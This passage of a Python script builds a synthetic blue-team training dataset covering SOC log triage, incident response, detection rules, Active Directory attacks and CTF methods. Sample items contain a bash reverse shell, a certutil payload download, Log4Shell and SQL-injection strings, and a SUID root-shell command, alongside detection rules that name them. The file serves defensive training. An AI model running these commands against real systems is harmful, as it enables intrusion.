         "**Sequence:** 45 rapid **4625** failures then a **4624** success for `svc_sql` from "
         "`10.0.5.99` is a successful **network password-guessing** attack on a service "
         "account.\n\n"
         "**Next:** isolate `10.0.5.99`; reset `svc_sql` and review its SPNs; hunt on the "
         "source host for the tool (e.g. CrackMapExec)."),
        ("web-traversal-sqli",
         "192.0.2.45 \"GET /view?page=../../../../etc/passwd HTTP/1.1\" 200 2412\n"
         "192.0.2.45 \"GET /api/products?id=1 UNION SELECT null,username,password FROM users-- HTTP/1.1\" 200 5840",
         "Identify the two attack classes, whether they likely succeeded, and the code fix.",
         "**Request 1 — path traversal:** `page=../../../../etc/passwd` returned **200/2412 "
         "bytes**, suggesting the file was served. Fix: validate against an allowlist / use "
         "basename, never concatenate user input into a path.\n\n"
         "**Request 2 — UNION SQL injection:** returned **200/5840 bytes**, suggesting rows "
         "were exfiltrated. Fix: **parameterized queries** with typed binding for `id`."),
        ("win-4688-encoded-ps",
         "Event 4688: New process. Parent: C:\\Windows\\System32\\w3wp.exe -> "
         "cmd.exe /c powershell.exe -nop -w hidden -enc JABjAGwAaQBl...",
         "Explain the chain, why it is suspicious, and the ATT&CK techniques.",
         "**Chain:** IIS worker `w3wp.exe` -> `cmd.exe` -> hidden, base64-encoded PowerShell. "
         "A web worker spawning an obfuscated shell strongly indicates a **web shell / RCE**.\n\n"
         "**ATT&CK:** **T1505.003** (Web Shell), **T1059.001** (PowerShell) with `-enc`/"
         "`-w hidden`, and **T1027** (Obfuscated Files or Information)."),
        ("dns-tunnel",
         "10.0.0.12 A 4d616c6963696f75.tunnel.attacker-domain.com\n"
         "10.0.0.12 TXT 4b65793d53657373.tunnel.attacker-domain.com",
         "What technique is this, how does the encoding work, and how do you detect it broadly?",
         "**Technique:** DNS tunneling / exfiltration (**T1071.004** / **T1048.003**). Data is "
         "hex/base32-encoded into subdomain labels and queried against an attacker-controlled "
         "apex (`tunnel.attacker-domain.com`).\n\n"
         "**Detection:** high Shannon entropy on labels, unusually long subdomains, high "
         "volume of TXT/NULL queries to one apex, and NXDOMAIN bursts per host."),
        ("sysmon1-lolbin",
         "Sysmon Event 1: Image: C:\\Windows\\System32\\certutil.exe  "
         "CommandLine: certutil -urlcache -split -f http://198.51.100.7/a.exe a.exe",
         "What is happening and which ATT&CK technique applies?",
         "`certutil` is a signed Windows binary being abused as a **LOLBin to download** a "
         "remote payload (`-urlcache -split -f <url>`). This is **T1105 (Ingress Tool "
         "Transfer)**, often paired with **T1140** if it also decodes the file. Alert on "
         "certutil with a URL argument; it has no legitimate reason to fetch arbitrary EXEs."),
        ("linux-auditd-sudo",
         "type=USER_AUTH ... acct=\"jdoe\" exe=\"/usr/bin/sudo\" res=failed (x12)\n"
         "type=USER_CMD ... acct=\"jdoe\" cmd=\"/bin/bash\" res=success",
         "Interpret this auditd sequence.",
         "Twelve failed `sudo` authentications for `jdoe` followed by a successful `sudo` to "
         "`/bin/bash` indicates repeated password attempts culminating in a root shell. "
         "Confirm whether `jdoe` legitimately has sudo and whether the timing/host matches "
         "their baseline; if not, treat as credential misuse and review the resulting shell's "
         "activity."),
        ("cloudtrail-iam",
         "eventName=CreateAccessKey userIdentity.type=IAMUser ...\n"
         "eventName=AttachUserPolicy policyArn=arn:aws:iam::aws:policy/AdministratorAccess",
         "What does this CloudTrail sequence indicate?",
         "A user created a new access key and then attached **AdministratorAccess** to an IAM "
         "user. Together this is a classic **privilege-escalation / persistence** pattern in "
         "AWS (ATT&CK **T1098** Account Manipulation). Verify the actor was authorized to grant "
         "admin; if not, detach the policy, disable the key, and review what the new key did."),
        ("win-7045-service",
         "Event 7045: A service was installed. Service Name: mgtsvc  "
         "Image Path: %COMSPEC% /c powershell -enc <...>  Start Type: demand  Account: LocalSystem",
         "Interpret this System-log event.",
         "**Event ID 7045** logs a newly installed service. Here the image path is `cmd.exe /c "
         "powershell -enc ...` running as **LocalSystem** — services normally point at a real "
         "binary, not an encoded PowerShell one-liner. This is service-based execution/"
         "persistence (**T1543.003**) and matches PsExec-style lateral movement. Verify against "
         "change control; if unexpected, isolate and hunt the source host."),
        ("win-4769-spike",
         "Event 4769 x60 in 2 min from one account: many SPNs, Ticket Encryption Type 0x17, "
         "Failure Code 0x0.",
         "What does this Kerberos telemetry indicate?",
         "**Event ID 4769** is a TGS (service-ticket) request. Sixty successful requests for "
         "**many distinct SPNs** from one account, all with **RC4 (0x17)**, in two minutes is a "
         "textbook **Kerberoasting** signature (**T1558.003**): the attacker is bulk-requesting "
         "roastable tickets and forcing RC4 for faster offline cracking. Investigate the "
         "requesting account/host and reset exposed service-account passwords."),
        ("suricata-log4shell",
         "Suricata: HTTP User-Agent: ${jndi:ldap://198.51.100.9/a} -> 10.0.3.4:8080",
         "What is this and what should the SOC check?",
         "This is a **Log4Shell (JNDI injection)** attempt: a `${jndi:ldap://...}` string placed "
         "in a header so a vulnerable Log4j instance performs an attacker-controlled LDAP lookup "
         "and loads a remote class (exploitation of a public-facing app, **T1190**). Check "
         "whether `10.0.3.4:8080` runs a vulnerable Log4j version, whether it made the outbound "
         "LDAP call, and block egress to `198.51.100.9`."),
        ("zeek-conn-beacon",
         "Zeek conn.log: 10.0.5.7 -> 203.0.113.10:443 every ~60s, ~800 bytes each, over 6 hours.",
         "Interpret this Zeek connection pattern.",
         "Regular ~60-second connections of near-constant small size to one external host over "
         "hours is a **beaconing** pattern consistent with C2 over web protocols (**T1071.001**). "
         "The periodicity and low jitter — not any single connection — are the signal. Pivot on "
         "the destination's reputation, decode any TLS SNI/JA3, and attribute the source process "
         "before escalating."),
        ("win-4720-4728",
         "Event 4720: user account 'svc_helpdesk2' created.\n"
         "Event 4728: member added to security group 'Domain Admins' (member: svc_helpdesk2).",
         "Interpret this pair.",
         "A brand-new account (**4720**) was created and immediately added to **Domain Admins** "
         "(**4728**) — account creation for persistence (**T1136.002**) plus privileged group "
         "manipulation (**T1098**). Legitimate DA additions are rare and change-controlled. "
         "Verify the change ticket; if none, disable the account, remove the membership, and "
         "review what it did in the interval."),
        ("linux-webshell-access",
         "192.0.2.7 \"POST /uploads/img_8842.php HTTP/1.1\" 200 34  (User-Agent: curl/8.1)",
         "Why is this access-log line suspicious?",
         "A **POST to a .php file inside an uploads directory**, returning 200 to a `curl` "
         "client, strongly suggests a **web shell** being driven programmatically (uploads dirs "
         "should serve static files, not execute PHP). This maps to **T1505.003**. Check the "
         "file's contents and creation time, disable PHP execution in `uploads/`, and hunt for "
         "the upload flaw that placed it."),
        ("cloudtrail-disable-logging",
         "eventName=StopLogging (CloudTrail)  followed by  eventName=DeleteTrail",
         "What does this indicate and why is it high severity?",
         "An actor **stopped and deleted CloudTrail logging** — **Impair Defenses: Disable "
         "Cloud Logs (T1562.008)**. This is a classic anti-forensics move to blind detection "
         "before further action. Treat as high severity: alert immediately (these API calls "
         "should be tightly restricted), preserve any existing logs, and investigate the "
         "principal and everything it did around that time."),
        ("sysmon-11-dropper",
         "Sysmon Event 11 (FileCreate): Image: winword.exe  TargetFilename: "
         "C:\\Users\\bob\\AppData\\Roaming\\update.js",
         "Interpret this file-creation event.",
         "**Winword.exe writing a .js script** into a user AppData path is anomalous — Office "
         "apps don't normally drop scripts. This is a common macro-dropper pattern (initial "
         "access via a malicious document staging a second-stage script). Correlate with the "
         "next process-creation event (wscript/cscript running that file) and the document's "
         "source; detonate the doc in a sandbox."),
        ("dns-nxdomain-dga",
         "DNS log: host 10.0.6.2 issued 300 unique queries in 5 min to random-looking names, "
         "~90% returning NXDOMAIN.",
         "What does this pattern indicate?",
         "A burst of high-entropy, mostly-**NXDOMAIN** lookups is a classic **DGA (Domain "
         "Generation Algorithm)** beacon trying to find its live C2 domain among many generated "
         "candidates (**T1568.002**). Pivot on the source host/process, sinkhole or block the "
         "pattern, and hunt for the malware family generating the domains."),
        ("smb-c2-lateral",
         "Sysmon 3 (network): source svchost on WKS-3 -> WKS-9:445, then WKS-9 spawns "
         "services.exe -> cmd.exe seconds later.",
         "Interpret this cross-host sequence.",
         "An SMB (445) connection from WKS-3 to WKS-9 immediately followed by **service creation "
         "and a shell** on WKS-9 is a **PsExec-style lateral movement** (**T1021.002** + "
         "**T1569.002**). Correlate the two hosts' events, confirm the account used, and contain "
         "both; check WKS-9 for the copied service binary."),
        ("edr-defender-disabled",
         "EDR: 'Set-MpPreference -DisableRealtimeMonitoring $true' executed on SRV-12, then AV "
         "telemetry from that host stops.",
         "Why is this critical and what's the technique?",
         "An attacker disabled Defender real-time protection (**T1562.001**, Impair Defenses) to "
         "blind detection before acting — and the telemetry gap confirms it took effect. Treat "
         "as high severity: re-enable protection via a management channel, isolate SRV-12, and "
         "investigate what happened during the blind window using any forwarded/network logs."),
        ("auditd-reverse-shell",
         "auditd EXECVE: argc=3 a0=\"bash\" a1=\"-c\" a2=\"bash -i >& /dev/tcp/198.51.100.9/4444 0>&1\"",
         "What is this and which ATT&CK technique applies?",
         "This is a **bash reverse shell**: `bash -i >& /dev/tcp/<ip>/<port>` redirects an "
         "interactive shell over a TCP socket to the attacker (`198.51.100.9:4444`). It maps to "
         "**T1059.004 (Unix Shell)** for execution, supporting C2. Block egress to that host, "
         "identify the parent process that spawned it, and treat the host as compromised."),
        ("win-1102-cleared",
         "Event 1102: The audit log was cleared. Subject account: svc_backup.",
         "Why is this event significant?",
         "**Event ID 1102** means the **Security event log was cleared** — a classic "
         "anti-forensics move (**T1070.001**, Indicator Removal). A service/backup account "
         "clearing the security log is rarely legitimate. Treat as high signal: correlate with "
         "forwarded logs (a SIEM copy survives local clearing), and investigate everything "
         "`svc_backup` did before and after the clear."),
        ("proxy-useragent-c2",
         "Proxy log: 10.0.8.3 -> hxxps://cdn-analytics[.]top/js/collect  User-Agent: "
         "'Mozilla/5.0' every 30s, POST, 512 bytes.",
         "What does this pattern suggest?",
         "Regular 30-second POSTs of constant size to a low-reputation domain with a generic "
         "User-Agent is a **C2 beacon over HTTPS (T1071.001)** masquerading as analytics. The "
         "periodicity is the tell. Check domain age/reputation, JA3/TLS fingerprint, and the "
         "source process; block the domain and isolate 10.0.8.3 pending triage."),
        ("gpo-change",
         "AD audit: Event 5136 - a GPO 'Default Domain Policy' was modified to add a startup "
         "script from \\\\10.0.0.9\\share\\a.ps1.",
         "Why investigate this urgently?",
         "Modifying a widely-linked GPO to add a **startup script** is a powerful persistence + "
         "lateral-execution technique (**T1484.001**, Domain Policy Modification): the script "
         "runs on every affected machine as SYSTEM. Verify the change against change control; if "
         "unauthorized, revert the GPO, block the share, and hunt for execution of `a.ps1` "
         "across endpoints."),
        ("aws-guardduty-exfil",
         "GuardDuty: 'Exfiltration:S3/ObjectRead.Unusual' - principal downloaded 4,200 objects "
         "from a sensitive bucket to an external IP in 3 minutes.",
         "Interpret and respond.",
         "A large, fast, unusual read of a sensitive S3 bucket to an external IP is likely "
         "**data exfiltration (T1567.002 / T1530)**. Respond: identify the principal (user/role/"
         "key), **revoke its credentials/session**, check whether the access was authorized, "
         "restrict the bucket policy, and preserve CloudTrail/S3 access logs for scope and "
         "legal."),
        ("edr-office-child",
         "EDR: excel.exe -> cmd.exe -> powershell.exe -enc <...> on FINANCE-07.",
         "Interpret this process tree.",
         "**Excel spawning a shell** that runs encoded PowerShell is a hallmark **malicious "
         "macro** execution chain (**T1566.001** delivery, **T1204.002** user execution, "
         "**T1059.001** PowerShell with `-enc`). Office apps shouldn't launch shells. Decode the "
         "command (or pull 4104 script-block logs), isolate FINANCE-07, and find the source "
         "document and any network callbacks."),
    ]
    for key, log, task, ans in scen:
        dd.add(
            f"train-log-{key}",
            SYS_SOC,
            f"Log:\n```\n{log}\n```\nTask: {task}",
            ans,
            task_type="log_analysis",
            domain="blue_team",
            difficulty="advanced",
            requires_evidence=True,
            tags=["log_analysis", "siem", key],
        )


# ==========================================================================================
# 5. Incident response — distinct scenarios.
# ==========================================================================================

def _ir_family(dd: _Deduper) -> None:
    scen = [
        ("ransomware-isolate-not-poweroff",
         "An endpoint is actively encrypting network shares and dropping ransom notes. A junior "
         "analyst wants to pull the power cord. Evaluate that.",
         "**Do not power it off — isolate it from the network instead** (unplug Ethernet / "
         "disable Wi-Fi / kill the switch port).\n\n"
         "- Isolation stops SMB/RPC propagation to shares immediately.\n"
         "- A hard power-off **destroys RAM**, losing in-memory encryption keys, C2 addresses, "
         "and process context you need for recovery and scoping.\n"
         "- Abrupt power loss mid-write can also corrupt partially encrypted files beyond "
         "repair.\n\n"
         "After isolation: capture memory if feasible, identify the strain, and restore from "
         "known-good offline backups."),
        ("bec-token-revoke",
         "A finance user entered M365 credentials on a phishing page and the attacker logged in "
         "and approved an MFA push from a foreign IP. Give the IR workflow.",
         "1. **Revoke sessions & tokens** first: `Revoke-AzureADUserAllRefreshToken`, then reset "
         "the password — resetting the password alone does *not* kill an existing token.\n"
         "2. **MFA remediation:** remove any attacker-registered MFA methods.\n"
         "3. **Persistence hunt:** check for new **inbox forwarding rules**, mailbox delegate "
         "changes, and consented OAuth apps.\n"
         "4. **Scope:** use message trace to find everyone who got the phish and purge it "
         "tenant-wide."),
        ("order-of-volatility",
         "During a live host investigation, in what order should you collect evidence and why?",
         "Follow the **order of volatility** (RFC 3227): collect the most ephemeral data first.\n"
         "1. CPU registers/cache and **RAM** (live process memory, keys, network state).\n"
         "2. Network connections and ARP/route tables.\n"
         "3. Running processes and open files.\n"
         "4. Disk (filesystem, logs).\n"
         "5. Remote logging / archival media.\n\n"
         "Rationale: memory and network state vanish on reboot, while disk persists — so "
         "imaging RAM before touching disk preserves the most perishable evidence."),
        ("webshell-eradicate",
         "A PHP web shell was found in /var/www/html/uploads/. Give containment and eradication.",
         "**Contain:** pull the host from the load balancer; make `uploads/` non-executable "
         "(`php_admin_flag engine off`) and read-only; preserve access/error logs.\n\n"
         "**Root cause:** find the upload flaw (missing extension/MIME validation) from the "
         "logs.\n\n"
         "**Eradicate:** redeploy application code from a clean, version-controlled image "
         "(don't just delete the shell — assume more persistence); move uploads to a "
         "non-executable object store; rotate any secrets the web user could read."),
        ("svc-account-da",
         "An AD service account in Domain Admins shows interactive logons from an unknown jump "
         "box. Detail containment.",
         "**Contain:** disable/reset the service account and **purge its Kerberos tickets** so "
         "existing TGTs stop working; isolate the jump box (preserve memory/logs first).\n\n"
         "**Harden (root cause):** service accounts should **never** be in Domain Admins; deny "
         "interactive and RDP logon via GPO; migrate to **gMSA** for auto-rotated passwords. "
         "Then review what the account touched while the anomalous logons occurred."),
        ("dfir-evidence-preservation",
         "You must preserve a compromised Linux server for potential legal action. What are the "
         "key evidence-preservation steps?",
         "Work on **copies**, not the original: capture volatile data first (memory image, "
         "process/network state), then take a **bit-for-bit disk image** of the unmounted "
         "volume. **Hash** every image (SHA-256) at acquisition and record it. Maintain a "
         "**chain of custody** (who/what/when/where). Avoid rebooting or installing tools onto "
         "the original, which alters evidence."),
        ("contain-vs-eradicate",
         "A junior analyst asks why we 'contain' before we 'eradicate'. Explain the phases.",
         "The NIST IR phases are Preparation, Detection & Analysis, **Containment**, "
         "**Eradication**, **Recovery**, and Post-Incident. Containment (isolate, block, "
         "disable) stops ongoing damage and preserves evidence. Eradication removes the root "
         "cause (malware, backdoors, the exploited flaw). Eradicating before containing lets an "
         "adversary who still has active access simply re-establish footholds while you clean "
         "up."),
        ("dc-compromise-krbtgt",
         "You confirmed a domain controller was compromised and krbtgt may be exposed. What is "
         "the recovery priority?",
         "Assume total domain compromise. Priorities: (1) **reset the krbtgt password twice** "
         "(with replication between resets) to invalidate Golden Tickets; (2) reset privileged "
         "and service accounts; (3) rebuild the compromised DC from trusted media rather than "
         "cleaning it; (4) review AD for persistence (rogue admins, AdminSDHolder, GPO changes, "
         "AD CS templates). Do this under an assume-breach plan with out-of-band comms."),
        ("insider-offboarding",
         "A departing admin is suspected of planting persistence before leaving. What do you "
         "check?",
         "Audit for **backdoor access left behind**: newly created or re-enabled accounts, added "
         "SSH keys / API tokens / app passwords, scheduled tasks and services, added group "
         "memberships, mail forwarding/OAuth grants, and modified firewall/remote-access rules. "
         "Rotate all shared secrets the person knew, revoke their sessions/tokens, and review "
         "privileged-action logs over their final weeks."),
        ("tabletop-purpose",
         "Why run incident-response tabletop exercises, and what makes one effective?",
         "Tabletops rehearse decisions **before** a real incident, exposing gaps in roles, "
         "communications, authority to act (e.g. who can isolate production), and playbooks — "
         "cheaply, without touching production. An effective one uses a realistic scenario, "
         "includes decision-makers (not just responders), injects surprises, and ends with "
         "concrete action items and owners that actually get fixed."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-ir-{key}", SYS_IR, prompt, ans,
            task_type="incident_response", domain="blue_team", difficulty="advanced",
            requires_evidence=True, tags=["incident_response", key],
        )


# ==========================================================================================
# 6. Detection engineering — distinct rules/configs.
# ==========================================================================================

def _detection_family(dd: _Deduper) -> None:
    dd.add(
        "train-det-sigma-ps-download",
        SYS_DET,
        "Write a Sigma rule to detect PowerShell downloading and executing remote script "
        "content (WebClient/Invoke-WebRequest chained with IEX).",
        "```yaml\n"
        "title: PowerShell Download and Execute\n"
        "status: stable\n"
        "logsource:\n  category: process_creation\n  product: windows\n"
        "detection:\n"
        "  img:\n    Image|endswith: ['\\powershell.exe', '\\pwsh.exe']\n"
        "  download:\n    CommandLine|contains: ['Net.WebClient','DownloadString','Invoke-WebRequest','iwr ']\n"
        "  exec:\n    CommandLine|contains: ['iex','Invoke-Expression']\n"
        "  condition: img and download and exec\n"
        "falsepositives: ['signed deployment automation']\n"
        "level: high\n"
        "tags: [attack.execution, attack.t1059.001]\n"
        "```\n"
        "Maps to **T1059.001**. Reduce FPs by allowlisting known signed script paths.",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        tags=["detection_engineering", "sigma", "t1059.001"],
    )
    dd.add(
        "train-det-yara-php-webshell",
        SYS_DET,
        "Write a YARA rule for obfuscated PHP web shells using base64_decode with dynamic "
        "execution.",
        "```yara\n"
        "rule PHP_Obfuscated_Webshell {\n"
        "  meta:\n    description = \"obfuscated PHP webshell: base64_decode + dynamic eval on user input\"\n"
        "  strings:\n"
        "    $php = \"<?php\" nocase\n"
        "    $eval = /(\\beval\\b|\\bassert\\b|preg_replace\\s*\\(.*\\/e)/ nocase\n"
        "    $b64 = \"base64_decode\" nocase\n"
        "    $src = /\\$_(POST|GET|COOKIE|REQUEST)/ \n"
        "  condition:\n    $php at 0 and $eval and $b64 and $src and filesize < 50KB\n"
        "}\n"
        "```\n"
        "Maps to **T1505.003**. The `filesize` bound and combined conditions keep it "
        "specific to small dropper shells.",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        tags=["detection_engineering", "yara", "t1505.003"],
    )
    dd.add(
        "train-det-sysmon-lsass",
        SYS_DET,
        "How do you use Sysmon Event ID 10 to detect credential dumping against lsass.exe?",
        "Configure **Sysmon Event ID 10 (ProcessAccess)** to log handles opened to "
        "`lsass.exe`, filtering on read access masks used by dumpers:\n"
        "```xml\n<ProcessAccess onmatch=\"include\">\n"
        "  <TargetImage condition=\"is\">C:\\Windows\\system32\\lsass.exe</TargetImage>\n"
        "  <GrantedAccess condition=\"contains any\">0x1010;0x1410;0x1438;0x143a;0x1f0fff</GrantedAccess>\n"
        "</ProcessAccess>\n```\n"
        "`0x1010`/`0x1410` include **PROCESS_VM_READ (0x10)**, required to read credential "
        "memory (Mimikatz, procdump). Exclude known-good readers (AV/EDR) by SourceImage. "
        "Maps to **T1003.001**.",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        tags=["detection_engineering", "sysmon", "t1003.001"],
    )
    dd.add(
        "train-det-4769-kerberoast",
        SYS_DET,
        "Write a detection concept for Kerberoasting from domain-controller telemetry.",
        "Alert on **Event ID 4769 (Kerberos service-ticket request)** where "
        "**Ticket Encryption Type = 0x17 (RC4)** for accounts that should use AES, especially "
        "many distinct SPNs requested by one principal in a short window from an unusual host. "
        "RC4 is requested because it is faster to crack **offline**. Tune out legitimate "
        "RC4-only services, and pair with a baseline of normal per-user 4769 volume. Detects "
        "**T1558.003** without relying on failed-logon events (there are none).",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        tags=["detection_engineering", "kerberoasting", "t1558.003", "event_4769"],
    )
    dd.add(
        "train-det-attack-chain-mapping",
        SYS_DET,
        "Map this chain to ATT&CK IDs: spearphishing macro doc -> mshta runs VBScript -> "
        "dump LSASS with sekurlsa -> move laterally via PsExec (SMB).",
        "- Spearphishing attachment: **T1566.001**\n"
        "- mshta proxy execution: **T1218.005** (with **T1059.005** for the VBScript)\n"
        "- LSASS credential dumping: **T1003.001**\n"
        "- Lateral movement via PsExec over admin shares: **T1021.002**\n\n"
        "Tactics traversed: Initial Access -> Execution -> Credential Access -> Lateral "
        "Movement.",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        requires_evidence=False, tags=["detection_engineering", "attack_mapping", "chain"],
    )
    dd.add(
        "train-det-4662-dcsync",
        SYS_DET,
        "Write a detection concept for DCSync from Windows DC telemetry.",
        "Alert on **Event ID 4662 (operation on an object)** where the Properties include the "
        "**replication extended-right GUIDs** `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` "
        "(DS-Replication-Get-Changes) and `1131f6ad-...` (…-All), when the requesting account "
        "is **not** a domain controller. Baseline which accounts legitimately replicate (DCs, "
        "Entra Connect) and alert on anything else. Detects **T1003.006** without needing code "
        "execution on the DC.",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        tags=["detection_engineering", "dcsync", "t1003.006", "event_4662"],
    )
    dd.add(
        "train-det-kql-newservice",
        SYS_DET,
        "Write a KQL (Microsoft Sentinel/Defender) query concept to find suspicious new "
        "Windows services.",
        "```kql\nDeviceEvents\n| where ActionType == 'ServiceInstalled'\n"
        "| where ServiceName != '' \n"
        "| where InitiatingProcessFileName in~ ('cmd.exe','powershell.exe','psexesvc.exe')\n"
        "   or ServiceImagePath has_any ('powershell','-enc','cmd /c','\\\\Temp\\\\')\n"
        "| project Timestamp, DeviceName, ServiceName, ServiceImagePath, InitiatingProcessFileName\n"
        "```\n"
        "Surfaces **T1543.003 / T1569.002** (service persistence & PsExec-style execution). "
        "Tune out known deployment tools by signer/path.",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        tags=["detection_engineering", "kql", "t1543.003"],
    )
    dd.add(
        "train-det-splunk-spray",
        SYS_DET,
        "Write a Splunk SPL concept to detect password spraying against Windows auth.",
        "```spl\nindex=wineventlog EventCode=4625\n"
        "| bin _time span=10m\n"
        "| stats dc(Account_Name) as accounts_targeted count as failures by _time, Source_Network_Address\n"
        "| where accounts_targeted >= 10 AND failures >= 10\n"
        "```\n"
        "Spraying is **many accounts, few attempts each** from one source, so the signal is a "
        "high **distinct-account** count per source in a short window (not many failures on one "
        "account). Detects **T1110.003**; follow any subsequent 4624 success from the same "
        "source.",
        task_type="detection_engineering", domain="blue_team", difficulty="advanced",
        tags=["detection_engineering", "splunk", "t1110.003"],
    )


# ==========================================================================================
# 7. Active Directory — distinct attack/defense explanations.
# ==========================================================================================

def _ad_family(dd: _Deduper) -> None:
    scen = [
        ("kerberoasting-mechanics",
         "Explain how Kerberoasting works, why attackers request RC4, and how to defend.",
         "Any authenticated domain user can request a **TGS** for any account that has an "
         "**SPN**. The DC encrypts the ticket with a key derived from the **service account's "
         "password**; the attacker extracts it and cracks it **offline** — no failed logons. "
         "Attackers force **RC4 (etype 0x17)** because it cracks far faster than AES.\n\n"
         "**Defend:** migrate service accounts to **gMSA** (long, auto-rotated passwords); "
         "**enforce AES / disable RC4**; alert on **Event ID 4769** with encryption type 0x17. "
         "ATT&CK: **T1558.003 (Credential Access, TA0006)**."),
        ("asrep-vs-kerberoast",
         "What property enables AS-REP Roasting and how does it differ from Kerberoasting?",
         "AS-REP Roasting needs the account to have **'Do not require Kerberos "
         "preauthentication'** set (`DONT_REQ_PREAUTH`). The attacker sends an AS-REQ with no "
         "pre-auth; the DC returns an **AS-REP** whose encrypted part is derived from the "
         "user's password, cracked offline.\n\n"
         "**Difference:** Kerberoasting (**T1558.003**) needs an **SPN** and attacks the "
         "**TGS**; AS-REP Roasting (**T1558.004**) needs **no SPN** and attacks the **AS-REP** "
         "of pre-auth-disabled accounts. Fix: audit for `DoesNotRequirePreAuth` and remove it."),
        ("dcsync",
         "Explain how DCSync abuses replication to steal credentials and how to detect it.",
         "DCSync uses the **Directory Replication Service (DRSUAPI / DRSGetNCChanges)** to ask "
         "a DC for account secrets *as if it were another DC*. It needs replication rights "
         "(**DS-Replication-Get-Changes / -All**) and runs no code on the DC, returning hashes "
         "including `krbtgt` and Administrator.\n\n"
         "**Detect:** **Event ID 4662** referencing the replication extended-right GUIDs from a "
         "**non-DC** source IP. ATT&CK: **T1003.006**."),
        ("golden-vs-silver",
         "Contrast Golden and Silver tickets: what key signs each and what is the scope?",
         "**Golden ticket** = a forged **TGT** encrypted with the **KRBTGT** key -> whole-"
         "domain access; presented to the DC to obtain any service ticket.\n"
         "**Silver ticket** = a forged **TGS** encrypted with a **specific service account's** "
         "key -> access only to that one service, and it is presented **directly to the "
         "service without contacting the DC** (so no 4769 on the DC).\n\n"
         "Golden-ticket remediation: reset **KRBTGT twice** (with replication between) to "
         "invalidate current and prior keys."),
        ("pth-vs-ptt",
         "Contrast Pass-the-Hash with Pass-the-Ticket.",
         "**Pass-the-Hash (T1550.002)** reuses a captured **NTLM hash** to authenticate over "
         "NTLM without the plaintext password. **Pass-the-Ticket (T1550.003)** reuses a stolen "
         "**Kerberos ticket** (TGT or service ticket) directly. PtH targets NTLM auth; PtT "
         "targets Kerberos. Mitigations differ: PtH is blunted by Credential Guard/LAPS and "
         "disabling NTLM where possible; PtT by protecting ticket material and short ticket "
         "lifetimes."),
        ("llmnr-responder",
         "Explain LLMNR/NBT-NS poisoning and the simple hardening that kills it.",
         "When DNS fails, Windows falls back to **LLMNR/NBT-NS** broadcasts. A tool like "
         "Responder answers 'that's me' and captures the victim's **NetNTLMv2** challenge/"
         "response, which is cracked offline or relayed (**T1557.001**). The simple, high-impact "
         "hardening: **disable LLMNR and NBT-NS** via GPO/interface settings so the broadcast "
         "fallback never happens, and enable SMB signing to defeat relay."),
        ("adcs-esc1",
         "At a high level, what makes an AD CS certificate template dangerous (ESC1-style), and "
         "the fix?",
         "Danger arises when a template lets a **low-privileged user enroll**, permits an "
         "**arbitrary Subject Alternative Name (SAN)**, and is valid for **client "
         "authentication** — so a user requests a cert 'as' a domain admin and authenticates as "
         "them (a PKINIT path to domain compromise). Fix: remove enrollee-supplied SAN, require "
         "manager approval, restrict enrollment rights, and audit templates. This is a "
         "configuration flaw, not a Kerberos protocol bug."),
        ("unconstrained-delegation",
         "Why is Kerberos unconstrained delegation dangerous?",
         "A host trusted for **unconstrained delegation** caches the **TGT** of any user who "
         "authenticates to it. If an attacker compromises that host (or coerces a privileged "
         "account, e.g. a DC, to authenticate to it), they harvest that TGT and impersonate the "
         "user domain-wide. Prefer **constrained**/**resource-based constrained delegation**, "
         "mark sensitive accounts 'cannot be delegated', and minimize unconstrained hosts."),
        ("gmsa-benefits",
         "What problem do Group Managed Service Accounts solve?",
         "gMSAs give services a **128-character, complex password that AD rotates automatically** "
         "(no human ever knows it) and scopes which hosts may retrieve it. That removes static, "
         "rarely-rotated service passwords — the exact weakness Kerberoasting exploits — and "
         "eliminates password sprawl in config files. Retrieval is authorized per-host via AD."),
        ("bloodhound-purpose",
         "What does BloodHound show a defender, and how do you use it?",
         "BloodHound maps AD **attack paths** by collecting relationships (group membership, "
         "admin rights, sessions, ACLs, delegation) into a graph and finding shortest paths to "
         "high-value targets like Domain Admins. Defensively, use it to **find and cut** those "
         "paths: remove excessive rights, break risky ACLs, reduce where privileged accounts log "
         "on, and re-run to confirm the path is gone."),
        ("ntlm-vs-kerberos",
         "Contrast NTLM and Kerberos authentication in Active Directory.",
         "**Kerberos** is the default: ticket-based, uses a trusted KDC, supports mutual auth and "
         "delegation, and avoids sending reusable secrets. **NTLM** is the legacy challenge/"
         "response fallback: no mutual auth, vulnerable to **relay** and **pass-the-hash**, and "
         "used when Kerberos can't be (IP-based access, workgroup, some legacy apps). Harden by "
         "restricting/auditing NTLM and enforcing SMB/LDAP signing."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-ad-{key}", SYS_AD, prompt, ans,
            task_type="active_directory", domain="blue_team", difficulty="advanced",
            tags=["active_directory", "kerberos", key],
        )


# ==========================================================================================
# 8. CTF / methodology, fundamentals, network, safety — distinct authored items.
# ==========================================================================================

def _ctf_family(dd: _Deduper) -> None:
    scen = [
        ("suid-find",
         "On an authorized CTF host you find /usr/bin/find has the SUID bit. Why does that "
         "allow privilege escalation and how do you remediate it?",
         "The **SUID bit** runs the binary with the file owner's privileges (root). `find` has "
         "a built-in `-exec`, so `find . -exec /bin/sh -p \\; -quit` spawns a shell as **root**. "
         "Remediate by removing the bit (`chmod u-s /usr/bin/find`) and auditing all SUID "
         "binaries (`find / -perm -4000 -type f 2>/dev/null`), keeping only those that need it."),
        ("ssrf-metadata",
         "Explain SSRF against cloud metadata (169.254.169.254) and the primary defenses.",
         "If an app fetches a **user-supplied URL** server-side without restricting internal "
         "ranges, an attacker points it at the **link-local `169.254.169.254`** to read "
         "instance credentials/IAM role tokens. Defenses: block egress to `169.254.169.254/32`, "
         "enforce **IMDSv2** (token-required, blocks naive GET SSRF), and validate/resolve URLs "
         "against an allowlist that rejects private ranges."),
        ("unquoted-service-path",
         "How do unquoted Windows service paths cause privilege escalation and how do you fix "
         "them?",
         "If a service's `ImagePath` has spaces and no quotes (e.g. `C:\\Program Files\\App\\"
         "svc.exe`), Windows tries `C:\\Program.exe`, then `C:\\Program Files\\App.exe`, etc. "
